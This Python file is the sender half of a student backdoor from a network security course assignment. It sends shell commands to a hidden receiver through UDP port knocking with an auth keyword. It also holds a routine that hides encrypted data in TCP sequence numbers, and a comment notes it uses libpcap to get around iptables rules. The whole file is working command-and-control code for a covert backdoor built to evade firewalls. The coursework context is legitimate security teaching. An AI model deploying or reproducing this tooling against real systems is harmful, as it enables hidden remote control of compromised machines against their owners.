#!/usr/bin/env python3

"""
----------------------------------------------------------------------------------------------------
COMP 8505 BTech Network Security & Applications Development
Assignment 3:
    - To become familiar with packet sniffing backdoors and to implement Linux backdoors.
Student:
    - Hung Yu (Angus) Lin, A01034410, Set 7J
----------------------------------------------------------------------------------------------------
sender.py
    - Contains sender command line UI send a command hidden in UDP port knocking to receiver backdoor,
      then decrypts the data returned from backdoor and display to user.
----------------------------------------------------------------------------------------------------
"""

from _thread import *
from scapy.all import *
from scapy.layers.inet import *
import encryption
# Set scapy to use libpcap library to circumvent iptables rules.
from scapy.all import conf
conf.use_pcap = True

LOG_PATH = "log.txt"
CONFIGURATION_PATH = "configuration.txt"


def read_configuration():
    """
    Reads configuration file.
    :return: list (config vars)
    """

    configuration = {
        'receiver_address': '',
        'sender_address': '',
        'receiver_port1': 0,
        'receiver_port2': 0,
        'receiver_port3': 0,
        'sender_port': 0,
        'port_knock_auth': '',
    }

    with open(file=CONFIGURATION_PATH, mode='r', encoding='utf-8') as file:
        fp = [line.rstrip('\n') for line in file]
        for line in fp:
            if line.isspace() or line.startswith('#'):
                continue

            config_data = line.split('=')
            if config_data[0] in configuration:
                if config_data[0] in ('receiver_address', 'sender_address', 'port_knock_auth'):
                    configuration[config_data[0]] = config_data[1]
                elif config_data[0] in ('receiver_port1', 'receiver_port2', 'receiver_port3', 'sender_port'):
                    data = config_data[1]
                    if data.isdigit():
                        configuration[config_data[0]] = int(config_data[1])
                    else:
                        print("Invalid configuration, ports must be integers.")
                        exit()
                else:
                    print("Invalid configuration, unsupported variable detected.")
                    exit()

    return configuration


def start_sender():
    print("Starting Sender. (Type \"exit\" to shutdown)")

    # Generate encryption key if needed. Ensure both sender and receiver have same key.
    encryption.generate_key()

    # Read Configuration
    config = read_configuration()
    receiver_addr = config['receiver_address']
    port1 = config['receiver_port1']
    port2 = config['receiver_port2']
    port3 = config['receiver_port3']
    sender_addr = config['sender_address']
    sender_port = config['sender_port']
    port_knock_auth = config['port_knock_auth']

    keep_going = True
    while keep_going:
        user_input = input("Enter a command to send to backdoor (ie. \"ifconfig\"): ")
        if user_input == "exit":
            print("Sender Shutdown.")
            break

        try:
            encoded_input = user_input.encode("utf-8").decode("utf-8")
        except UnicodeEncodeError or UnicodeDecodeError:
            print("Invalid character detected. Must be UTF-8 supported values only.")
            continue

        send_port_knock_command(user_input, receiver_addr, port1, port2, port3, sender_addr, sender_port,
                                port_knock_auth)


def send_port_knock_command(message, receiver_addr, port1, port2, port3, sender_addr, sender_port,
                            port_knock_auth):

    sport = RandShort()
    command_payload = port_knock_auth + "|" + message

    # Port-knocking 3 UDP ports with Auth keyword as payload. Include command at end of last packet payload.
    port_knock_1 = IP(dst=receiver_addr) / UDP(sport=sport, dport=port1) / Raw(load=port_knock_auth)
    port_knock_2 = IP(dst=receiver_addr) / UDP(sport=sport, dport=port2) / Raw(load=port_knock_auth)
    port_knock_3 = IP(dst=receiver_addr) / UDP(sport=sport, dport=port3) / Raw(load=command_payload)
    send(port_knock_1, verbose=0)
    send(port_knock_2, verbose=0)
    send(port_knock_3, verbose=0)


def send_message(message, receiver_addr, port):

    dst = receiver_addr
    sport = RandShort()
    dport = 900

    # 3-way-handshake
    ip = IP(dst=dst)  # ip = IP(dst=dst, frag=0)
    tcp_syn = ip/TCP(sport=sport, dport=dport, flags='S')
    tcp_synack = sr1(tcp_syn, verbose=0, timeout=5)

    if tcp_synack is None:
        print("3-way-handshake failed. No response from receiver.")
        return
    tcp_ack = ip / TCP(sport=sport, dport=dport, flags='A', seq=tcp_synack.ack, ack=tcp_synack.seq + 1)
    send(tcp_ack, verbose=0)

    # Starting to send data.
    cur_seq = tcp_synack.ack
    cur_ack = tcp_synack.seq + 1

    data = encryption.encrypt(message.encode("ascii")).decode("ascii")
    # data = message
    current_seq = 1000
    for c in data:
        if current_seq > 2000000000:
            current_seq = 0
        current_seq += 1000
        stega_seq = current_seq + ord(c)

        tcp_pushack = ip / TCP(sport=sport, dport=dport, flags='PA', seq=stega_seq, ack=cur_ack)
        send(tcp_pushack, verbose=0)
        cur_seq = stega_seq
        # cur_ack = tcp_ack.seq
        # cur_seq += len(data)
        # RESPONSE = sr1(ip / PUSHACK / Raw(load=data))

    # Closing TCP connection
    # start_new_thread(wait_for_fin_ack, (address, ip, sport, dport))
    tcp_fin = ip / TCP(sport=sport, dport=dport, flags="FA", seq=cur_seq, ack=cur_ack)
    # tcp_finack = sr1(tcp_fin)
    send(tcp_fin, verbose=0)
    # tcp_lastack = ip / TCP(sport=sport, dport=dport, flags="A", seq=tcp_finack.ack, ack=tcp_finack.seq + 1)
    tcp_lastack = ip / TCP(sport=sport, dport=dport, flags="A", seq=cur_seq, ack=cur_ack + 1)
    send(tcp_lastack, verbose=0)
    print("Send Complete.")


# def wait_for_fin_ack(address, ip, sport, dport):
#     print("sniffing")
#     # tcp_finack = sniff(filter=f"host {address} and tcp-fin != 0", count=1)
#     tcp_finack = sniff(filter=f"host {address} and tcp-fin != 0", count=1)
#     print("sniffed!")
#     print(tcp_finack)
#     ack = tcp_finack[0].payload.payload.ack
#     seq = tcp_finack[0].payload.payload.seq
#     print(f"ack {ack}")
#     print(f"seq {seq}")
#     tcp_lastack = ip / TCP(sport=sport, dport=dport, flags="A", seq=ack, ack=seq + 1)
#     send(tcp_lastack)

    # IPv4 Socket connection to receiver.
    # with socket(AF_INET, SOCK_STREAM) as sock:
    #     sock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
    #     sock.connect((address, port))
    #     sock.sendall(message.encode("utf-8"))
    #     print(f"Receiver: \tIP = {address}, Port = {port}")
    #     print(f"Message Sent: \t{message}")


if __name__ == "__main__":
    try:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        start_sender()
    except KeyboardInterrupt as e:
        print("Sender Shutdown")
        exit()


